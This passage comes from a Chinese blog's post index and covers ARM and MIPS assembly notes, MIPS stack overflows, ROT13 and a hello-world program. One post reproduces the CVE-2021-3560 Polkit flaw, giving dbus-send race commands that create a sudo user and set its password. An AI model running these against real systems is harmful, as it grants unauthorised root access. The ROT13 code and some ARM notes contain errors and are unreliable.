的低4 位清零，其它位不变 BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1 CMP 比较指令 CMP{cond} Rn,operand2 指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 CMP 指令不保存运算结果 CMP R1,#10 ;R1 与10 比较，设置相关标志位 CMP R1,R2 ;R1 与R2 比较，设置相关标志位 **CMN **负数比较指令 CMN{cond} Rn,operand2 指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位 CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。 TST 位测试指令 TST{cond} Rn,operand2 指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行 TST R0,#0x01 ;判断R0 的最低位是否为0 TST R1,#0x0F ;判断R1 的低4 位是否为0 TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。 TEQ 相等测试指令 TEQ{cond} Rn,operand2 指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位) TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。 MUL 32 位乘法指令 MUL{cond}{S} Rd,Rm,Rs 指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中 MUL R1,R2,R3 ;R1&#x3D;R2×R3 MULS R0,R3,R7 ;R0&#x3D;R3×R7，同时设置CPSR 中的N位和Z 位 MLA 32 位乘加指令 MLA{cond}{S} Rd,Rm,Rs,Rn 指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中 MLA R1,R2,R3,R0 ;R1&#x3D;R2×R3+R0 **UMULL ** 64 位无符号乘法指令 UMULL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中 UMULL R0,R1,R5,R8 ;(R1、R0)&#x3D;R5×R8 UMLAL 64 位无符号乘加指令 UMLAL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中 UMLAL R0,R1,R5,R8;(R1,R0)&#x3D;R5×R8+(R1,R0) **SMULL **64 位有符号乘法指令 SMULL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中 SMULL R2,R3,R7,R6 ;(R3,R2)&#x3D;R7×R6 SMLAL 64 位有符号乘加指令 SMLAL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中 SMLAL R2,R3,R7,R6;(R3,R2)&#x3D;R7×R6+(R3,R2) ARM跳转指令B B{cond} label 跳转到指定的地址执行程序，跳转到指令B 限制在当前指令的±32Mb 的范围内 B WAITA ;跳转到WAITA 标号处 B 0x1234 ;跳转到绝对地址0x1234 处 **BL **带链接的跳转指令 BL{cond} label 指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序 跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用 BL DELAY BX 带状态切换的跳转指令 BX{cond} Rm 跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码 ADRL R0,ThumbFun+1 BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态 BLXBLX目标地址：跳转，改变状态及保存PC值 ARM 协处理器指令CDP 协处理器数据操作指令 CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn,n 为0～15。 opcodel 协处理器的特定操作码。 CRd 作为目标寄存器的协处理器寄存器。 CRN 存放第1 个操作数的协处理器寄存器。 CRm 存放第2 个操作数的协处理器寄存器。 Opcode2 可选的协处理器特定操作码。 ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0 CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1 LDC 协处理器数据读取指令 LDC{cond}{L} coproc,CRd,&lt;地址&gt; L 可选后缀，指明是长整数传送。 coproc 指令操作的协处理器名。标准名为pn，n 为0～15 CRd 作为目标寄存的协处理器寄存器。 &lt;地址&gt; 指定的内存地址 LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中 LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中 STC 协处理器数据写入指令 STC{cond}{L} coproc,CRd,&lt;地址&gt; L 可选后缀，指明是长整数传送。 coproc 指令操作的协处理器名。标准名为pn，n 为0～15 CRd 作为目标寄存的协处理器寄存器。 &lt;地址&gt; 指定的内存地址 STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 STC p5,c1,[R0] STC p5,c1,[Ro,#-0x04] MCR ARM寄存器到协处理器寄存器的数据传送指令 MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn，n 为0～15。 cpcodel 协处理器的特定操作码。 RD 作为目标寄存器。 CRn 存放第1 个操作数的协处理器寄存器 CRm 存放第2 个操作数的协处理器寄存器。 Opcode2 可选的协处理器特定操作码。 MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 MCR p6,2,R7,c1,c2, MCR P7,0,R1,c3,c2,1, MRC 协处理器寄存器到ARM寄存器到的数据传送指令 MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn，n为0～15。 opcodel 协处理器的特定操作码。 Rd 作为目标寄存器。 CRn 存放第1 个操作数的协处理器寄存器。 CRm 存放第2 个操作数的协处理器寄存器。 opcode2 可选的协处理器特定操作码。 MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断 MRC p5,2,R2,c3,c2 MRC p7,0,R0,c1,c2,1 ARM 杂项指令SWI 软中断指令 SWI{cond} immed_24 immed_24 24 位立即数，值为0～16777215 之间的整数。 SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式 SWI 0 ;软中断，中断立即数为0 SWI 0x123456 ;软中断，中断立即数为0x123456 使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。 （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。 MOV R0,#34 ;设置了功能号为34 SWI 12 ;调用12 号软中断 （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。 MOV R0,#12 ;调用12 号软中断 MOV R1,#34 ;设置子功能号为34 SWI 0 ; 在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。 读出SWI 立即数： T_bit EQU 0x20 SWI_Hander STMFD SP!,&#123;R0_R3,R12,LR&#125; ;现场保护 MRS R0,SPSR ;读取SPSR STMFD SP!,&#123;R0&#125; ;保存SPSR TST R0,#T_bit ;测试T标志位 LDRNEH R0,[LR,#-2] ;若是Thumb指令，读取指令码(16 位) BICNE R0,R0,#0xFF00 ;取得Thumb 指令的8 位立即数 LDREQ R0,[LR,#-4] ;若是ARM 指令，读取指令码(32 位) BICNQ R0,R0,#0xFF00000 ;取得ARM 指令的24 位立即数 … LDMFD SP!,&#123;R0-R3,R12,PC&#125;^ ;SWI 异常中断返回 MRS 读状态寄存器指令 MRS{cond} Rd ,psr Rd 目标寄存器。Rd 不允许为R15。 psr CPSR 或SPSR 在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中 MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许&#x2F;禁止IRQ&#x2F;FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来 MRS R1,CPSR ;将CPSR状态寄存器读取，保存到R1 中 MRS R2,SPSR ;将SPSR状态寄存器读取，保存到R2 中 使能IRQ 中断例程： ENABLE_IRQ MRS R0,CPSR BIC R0。R0,#0x80 MSR CPSR_c,R0 MOV PC,LR 禁能IRQ 中断例程： DISABLE_IRQ MRS R0,CPSR ORR R0,R0,#0x80 MSR CPSR_c,R0 MOV PC,LR MSR 写状态寄存器指令 MSR{cond} psr_fields,#immed_8r MSR{cond} psr_fields,Rm 其中： psr CPSR 或SPSR fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)： c 控制域屏蔽字节(psr[7…0]) x 扩展域屏蔽字节(psr[15…8]) s 状态域屏蔽字节(psr[23。…16]) f 标志域屏蔽字节(psr[31…24]) immed_8r 要传送到状态寄存器指定域的立即数，8 位。 Rm 要传送到状态寄存器指定域的数据的源寄存器。 在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR MSR CPSR_c,#0xD3 ;CPSR[7…0]&#x3D;0xD3，即切换到管理模式。 MSR CPSR_cxsf,R3 ;CPSR&#x3D;R3 只有在特权模式下才能修改状态寄存器。程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态&#x2F;Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许&#x2F;禁止IRQ&#x2F;FIQ 中断等设置。 堆栈指令实始化例程： INITSTACK MOV R0,LR ;保存返回地址 ;设置管理模式堆栈 MSR CPSR_c,#0xD3 LDR SP,StackSvc ;设置中断模式堆栈 MSR CPSR_c,#0xD2 LDR SP,StackIrq ARM 伪指令ADR 小范围的地址读取伪指令 ADR{cond} register,exper register 加载的目标寄存器。 exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。 对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。 ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败 LOOP MOV R1, #0xF0 … ADR R2, LOOP ;将LOOP 的地址放入R2 ADR R3, LOOP+4 可以用ADR 加载地址，实现查表： … ADR R0,DISP_TAB ;加载转换表地址 LDRB R1,[R0,R2] ;使用R2作为参数，进行查表 … DISP_TAB DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90 ADRL 中等范围的地址读取伪指令 ADR{cond} register,exper register 加载的目标寄存器。 expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。 ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败 ADRL R0,DATA_BUF … ADRL R1 DATA_BUF+80 … DATA_BUF SPACE 100 ;定义100 字节缓冲区 可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：… ADR LR,RETURNI ;设置返回地址 ADRL R1Thumb_Sub+1 ;取得了Thumb 子程序入口地址，且R1 的0 位置1 BX R1 ;调用Thumb子程序，并切换处理器状态 RETURNI … CODE16 Thumb_Sub MOV R1,#10 … LDR 大范围的地址读取伪指令 LDR{cond} register,&#x3D;expr&#x2F;label_expr register 加载的目标寄存器 expr 32 位立即数。 label_expr 基于PC 的地址表达式或外部表达式。 LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量 LDR R0,&#x3D;0x123456 ;加载32 位立即数0x12345678 LDR R0,&#x3D;DATA_BUF+60 ;加载DATA_BUF 地址+60 … LTORG ;声明文字池 伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数： … LDR R0,&#x3D;IOPIN ;加载GPIO 寄存器IOPIN 的地址 LDR R1,[R0] ;读取IOPIN 寄存器的值 … LDR R0,&#x3D;IOSET LDR R1,&#x3D;0x00500500 STR R1,[R0] ;IOSET&#x3D;0x00500500 … 从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“&#x3D;”号 NOP 空操作伪指令NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等 使用就单NOP ARM寻址立即数寻址立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%” 寄存器间接寻址操作数的地址在寄存器中 ADD R0，R1，[R2] 基址变址寻址将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址 ADD R0，R1，[R2] 多寄存器寻址一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值 LDMIA R0，{R1，R2，R3，R4} 相对寻址以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址 例如：BL NEXT ARM堆栈的增长方式当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack) 当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack) 递增堆栈：向高地址方向生长 递减堆栈：向低地址方向生长","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"MIPS栈溢出原理","slug":"逆/mipsStackOverFlow","date":"2021-08-11T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/bd2e4070.html","link":"","permalink":"http://example.com/article/bd2e4070.html","excerpt":"","text":"MIPS的函数调用小知识： Mips 调用函数时不会将返回地址放入栈中，而在非叶子函数中，为了调用下一个函数，会将上一个函数的返回地址压栈 叶子函数，即该函数中不会调用任何其他函数 非叶子函数，即该函数需要调用其他函数 mips的函数调用过程 当函数A执行到调用函数B的指令时，函数调用指令复制当前pc寄存器的值到ra寄存器中，即ra中存放返回地址 他这个没有专门的控制ra的指令，在ja指令执行的时候，给ra赋值了 程序跳转到函数B的时候，如果是非叶子函数，函数B会先把函数A的返回地址压栈（即ra寄存器的值压栈），叶子函数没有这个操作，返回地址就只存在于ra寄存器中 main函数一般是一个非叶子函数，我们几乎可以在任何mian开头看到 sw $ra,0x20+var_s4($sp)这条指令 函数B执行完之后，叶子函数直接使用jr $ra指令返回函数A，而非叶子函数则需要，从堆栈中取出返回地址，然后将返回地址放入ra寄存器，再使用jr $ra指令 下面是两个程序（叶子和非叶子）的分析叶子函数 这个程序中，add函数为叶子函数，我们去分析add函数调用之前做了什么。 这里使用mipsel-linux-gnu-gcc -o tree tree.c -static进行编译 然后使用qemu-mipsel -g 1234 tree与ida连用的动态调试 IDA remote另一篇文章会详细讲，这里就不赘述 下断点到main函数，能看到在400578处有看到将ra压栈的操作，这个就是操作系统的某个地址。 重点在0040059c这个行，调用add函数，先不关心参数调用，只看ra寄存器的相关操作 执行完00400578后，寄存器以及栈中的内容 继续执行至0040059c，此时ra值没有改变 执行jal add 跳转过来之后，ra的值变了，值正好是jr add的下一条可用指令（nop的目的只是为了对齐） 再看add的所有指令，会发现，只有跳回main函数指令出现了ra寄存器 非叶子函数 add中调用了printf()函数。 执行进入add函数，与叶子函数相同 进入之后，抬高堆栈后，执行了ra压栈操作，即00400544这一行的操作 上图是函数执行完之后，准备返回main，在0040059c这行把main函数的返回地址放回ra。 然后通过jr $ra返回main。 参数mips函数调用传递参数规则，前四个参数通过$a1- $a3寄存器传递，其他参数通过栈传递。 从main函数中来看，先将参数数字放到临时栈中（蓝色框中），然后将第五个参数去取出，放入add的栈中，然后将前四个栈放到a0-a3寄存器中（红框） 我们来尝试画出其栈图，下图是main函数的栈图 红框为上个函数的返回地址，蓝框为局部变量，绿的是第五个参数。 栈溢出我们使用下面代码来做实验 代码大意就是从passwd这个文件读取文件。 尝试使用大量字符串 运行发现报错 栈溢出的目的是覆盖返回地址，上面说过，main一般是一个典型的非叶子函数，而且passwd文件的读取是在main中执行的， 所以我们目标应该在main刚进来的ra位置，使用ida+qemuGdb调试。 运行至main 并且关注ra的值存放的位置，右键 -&gt; jump a new window 执行完ra压栈之后，栈中的数据 下面让程序读完passwd文件，这个地方有个小方法，读取一般是在循环中一个字符一个字符读的，所以向下单步执行，如果遇到多次循环，就可以尝试吧断点下载循环执行完的下一行。 上图发现循环，尝试在循环外下断，不要断在nop上，情况允许就尽量断在nop下一行 ida下使用f9可以继续运行，直到下一个断点，运行到00400500后可以看到，地址存放的地方已经被覆盖 接下来可以使用cyclic等工具来计算长度，编写poc或exp利用。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"MIPS指令集","slug":"逆/mips","date":"2021-08-09T16:00:00.000Z","updated":"2022-09-21T02:57:25.000Z","comments":true,"path":"article/6a1d16f9.html","link":"","permalink":"http://example.com/article/6a1d16f9.html","excerpt":"","text":"MIPS指令集mips （risc 精简指令集） 寄存器mips 有32个寄存器，编号是从$0到$31 没有强制规则，但约定用法还是引入了一堆约定名 尽量使用约定名或者叫助记符 下面是寄存器用法（截的scdn [En Takahashi]老哥的），这些东西不一定要记，尽量还是用到多查，时间久了也就记住了 比较特殊的是 $0号寄存器，他里边放的只有0，又叫0号寄存器 $31号寄存器，里边放的是函数调用指令的返回地址 $1号寄存器，又叫at，由编译器生成的复合指令使用 d v0,v1不够用的话用内存 hi和lo是两个跟乘法相关的寄存器，不是通用寄存器，所以不能用在其他地方 寻址寻址方式为地址 &#x3D; 基地址+偏移 数据类型c中 long int short char mips dword word halfword byte 长度 8 4 2 1 指令mips所有指令都是32位的 mips指令分为三种格式 R-format 其他所有的 I-format 有立即数的指令 J-format 无条件跳转 R-format对非立即数和跳转的操作 例如：add $8, $17, $18 &#x3D;》 $18 &#x3D; $8+$17 I-format数据放到寄存器，或者放入地址 分支（判断）指令 立即数运算 J-format跳转，类似于jump 常用汇编指令上边指令分类其实只是一个理解，详细的看下边 lb &#x2F; lh &#x2F; lw : 从存储器中读取一个byte&#x2F;half word&#x2F;word的数据到寄存器中 sb &#x2F; sh &#x2F;sw: 把一个byte&#x2F;half word&#x2F;word的数据从寄存器存储到存储器中 mov &#x2F; movz &#x2F; movn: 复制，n为负，z为零。mov $1,$2; movz $1,$2,$3($3为零则复制$2到$1) addi&#x2F;addiu: 把一个寄存器的内容加上一个立即数;u为不带符号加。 rd &#x3D; rs + im sub&#x2F;subu： 把两个定点寄存器的内容相减。 rd &#x3D; rs - rt div&#x2F;divu: 两个定点寄存器的内容相除。 mul&#x2F;mulu: 两个定点寄存器的内容相乘。 slt&#x2F;slti&#x2F;sltui: 如果rs的值小于rt，那么设置rd的值为1,否则设置rd的值为0。 rd &#x3D; (rs &lt; rt) ? 1 : 0 ; rd &#x3D; (rs &lt; im) ? 1 : 0 and&#x2F;andi: 与运算，两个寄存器中的内容相与 ;i为立即数。 rd &#x3D; rs &amp; rt ; rd &#x3D; rs &amp; im or&#x2F;ori: 或运算。 rd &#x3D; rs | rt ; rd &#x3D; rs | im xor&#x2F;xori: 异或运算。 rd &#x3D; rs ^ rt ;rd &#x3D; rs ^ im nor&#x2F;nori: 取反运算。 rd &#x3D; !(rs | rt) j&#x2F;jr&#x2F;jal&#x2F;jalr: j直接跳转 PC &#x3D; { (PC+4) [31,28] , addr, 00}；jr使用寄存器跳转 PC &#x3D; rs； jal $31 &#x3D; PC;PC &#x3D; {(PC+4) [31,28],addr,00} beq&#x2F;beqz&#x2F;benz&#x2F;bne: 条件转移eq相等，z零，ne不等。 beq , PC &#x3D; (rs &#x3D;&#x3D; rt) ? PC+4+im &lt;&lt; 2 : PC ; bne , PC &#x3D; (rs !&#x3D; rt) ? PC+4+im &lt;&lt; 2 : PC lui: 把一个16位的立即数填入到寄存器的高16位，低16位补零。 rt &#x3D; im * 65536(2^16) lw: rt &#x3D; memory[ rs + im] sw: memory[ rs + im] &#x3D; rt sll&#x2F;srl: 逻辑左移&#x2F;右移。 rd &#x3D; rs &lt;&lt; shamt ; rd &#x3D; rs &gt;&gt; shamt","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"CVE-2021-3560 Polkit权限提升漏洞复现","slug":"技/CVE-2021-3560","date":"2021-08-05T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/86aaf27b.html","link":"","permalink":"http://example.com/article/86aaf27b.html","excerpt":"","text":"CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务 Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服务 而我们在认证操作中断开连接，导致无法获取认证结果 具体后边会详细分析 由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit 复现环境：ubuntu20.04 http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso ssh（ 在本地ssh下操作） sudo apt install ssh sudo service ssh start ssh &#x75;&#115;&#x65;&#x72;&#110;&#97;&#109;&#101;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49; 具体为什么要用ssh，这里不做赘述，可以自行百度dbus dbus-send发送D-Bus消息的工具，主要用于测试 可以通过dbus-send从命令行触发polkit 通过dbus-send构造语句，来创建一个新用户 dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 正常情况返回肯定是认证不通过的 上面说了通过中断来实现认证通过 所以继续构造语句 dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $! 这里是开始执行后0.009秒断开连接 这里多久断开连接要看具体执行时间，可以在前面加time 测试 我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间 运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的 然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限 现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆 继续构造语句来设置密码 这里涉及到一个知识点，dbus接口设置密码需要通过散列值 通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5) openssl passwd -5 password (这里password是个人需要设置的密码) 构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值) dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! 多试这个也需要多试几次 成功之后可以登陆尝试 至此，复现结束！ 原理通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon account-daemon收到请求后向poklit询问id为10的连接有没有权限 poklit向dbus-daemon询问该连接的uid 如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码 以上步骤完成后 poklit返回true给account-daemon account-daemon创建新用户 但是！ 如果我们在poklit向dbus-daemon询问该连接的uid时断开，那这个连接就不存在 不存在，就会返回错误 而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"智能合约","slug":"技/智能合约","date":"2021-08-05T16:00:00.000Z","updated":"2023-12-21T06:42:40.499Z","comments":true,"path":"article/c85b8ed3.html","link":"","permalink":"http://example.com/article/c85b8ed3.html","excerpt":"","text":"基于以太坊的solidity智能合约。 在线编辑器环境位置：https://remix.ethereum.org 智能合约文件是以.sol结尾 pragma solidity ^0.4.0; //预编译的作用，^代表版本向上兼容，兼容0.4.x，不能兼容到0.5.0","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"ROT13算法","slug":"技/Rot13","date":"2021-08-04T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/dd959000.html","link":"","permalink":"http://example.com/article/dd959000.html","excerpt":"","text":"ROT13加密算法凯撒加密的一个变种 单纯的将所有的字符后推13位，超过Z(z)的从A(a)开始换 这就导致他可以用一个算法实现加解密 str = input(&quot;输入要加解密的key：&quot;) flag = &quot;&quot; for i in str: n = ord(i) if (n &gt;= 97 and n &lt; 110) or (n &gt;= 65 and n &lt;= 78) : flag += chr(n+13) elif (n &gt;= 110 and n &lt; 122) or (n &gt;= 78 and n &lt;= 90): flag += chr(n-13) else: flag += i print(flag)","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"一个c语言代码变为c语言程序的全过程","slug":"逆/cAnd0101","date":"2021-08-01T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/5aedeb05.html","link":"","permalink":"http://example.com/article/5aedeb05.html","excerpt":"","text":"#include &lt;stdio.h&gt; int main(int argc, char const *argv[]) &#123; printf(&quot;hello world\\n&quot;); return 0; &#125; 